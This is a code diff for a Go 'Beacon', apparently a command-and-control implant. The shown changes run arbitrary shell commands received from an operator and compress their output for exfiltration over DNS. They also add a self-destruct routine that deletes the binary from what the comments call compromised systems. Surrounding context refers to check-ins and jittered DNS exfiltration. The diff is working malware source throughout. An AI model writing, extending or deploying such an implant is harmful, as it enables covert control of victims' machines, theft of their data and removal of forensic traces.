@@ -4,7 +4,11 @@
 package main
 
 import (
+	"bytes"
+	"compress/gzip"
+	"context"
 	"crypto/md5"
+	"encoding/base64"
 	"fmt"
 	"math/rand"
 	"os"
@@ -90,24 +94,106 @@ func (b *Beacon) checkIn() (string, error) {
 	return response, nil
 }
 
+// compressOutput compresses large output using gzip and base64 encoding
+// Returns compressed data with a prefix marker if compression was applied
+func compressOutput(data string) string {
+	// Only compress if output is larger than 1KB
+	if len(data) < 1024 {
+		return data
+	}
+
+	var buf bytes.Buffer
+	gzWriter := gzip.NewWriter(&buf)
+
+	_, err := gzWriter.Write([]byte(data))
+	if err != nil {
+		return data // Return original on compression error
+	}
+
+	if err := gzWriter.Close(); err != nil {
+		return data // Return original on close error
+	}
+
+	compressed := buf.Bytes()
+
+	// Only use compression if it actually reduces size by at least 20%
+	if len(compressed) < len(data)*4/5 {
+		encoded := base64.StdEncoding.EncodeToString(compressed)
+		return "GZIP:" + encoded
+	}
+
+	return data
+}
+
 // executeCommand runs a system command and returns the output
+// Commands are subject to a 5-minute timeout to prevent hanging
 func (b *Beacon) executeCommand(command string) string {
+	// Check for special commands
+	if command == "selfdestruct" || command == "uninstall" {
+		return b.selfDestruct()
+	}
+
+	// Create context with timeout (5 minutes default)
+	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Minute)
+	defer cancel()
+
 	var cmd *exec.Cmd
 
 	// Choose appropriate shell based on OS
 	switch runtime.GOOS {
 	case "windows":
-		cmd = exec.Command("cmd", "/c", command)
+		cmd = exec.CommandContext(ctx, "cmd", "/c", command)
 	default:
-		cmd = exec.Command("/bin/sh", "-c", command)
+		cmd = exec.CommandContext(ctx, "/bin/sh", "-c", command)
 	}
 
+	// Execute command with timeout
 	output, err := cmd.CombinedOutput()
+
+	// Check for timeout
+	if ctx.Err() == context.DeadlineExceeded {
+		return fmt.Sprintf("Error: Command timed out after 5 minutes\nPartial output: %s", string(output))
+	}
+
 	if err != nil {
 		return fmt.Sprintf("Error: %v\nOutput: %s", err, string(output))
 	}
 
-	return string(output)
+	result := string(output)
+
+	// Compress large outputs (>1KB) to reduce DNS traffic
+	return compressOutput(result)
+}
+
+// selfDestruct removes the beacon binary and exits
+// This command allows operators to cleanly remove the beacon from compromised systems
+func (b *Beacon) selfDestruct() string {
+	b.running = false // Stop the beacon loop
+
+	exePath, err := os.Executable()
+	if err != nil {
+		return fmt.Sprintf("Self-destruct failed: unable to determine executable path: %v", err)
+	}
+
+	// Schedule deletion after exit
+	go func() {
+		time.Sleep(2 * time.Second)
+
+		var cmd *exec.Cmd
+		switch runtime.GOOS {
+		case "windows":
+			// Use cmd to delete after a delay
+			cmd = exec.Command("cmd", "/c", "timeout /t 3 /nobreak && del /f /q", exePath)
+		default:
+			// Use sh to delete after a delay
+			cmd = exec.Command("sh", "-c", fmt.Sprintf("sleep 3 && rm -f '%s'", exePath))
+		}
+
+		cmd.Start()
+		os.Exit(0)
+	}()
+
+	return "Self-destruct initiated. Beacon will terminate and remove itself in 3 seconds."
 }
 
 // exfiltrateResult sends command results back via DNS using two-phase protocol with burst-based jitter
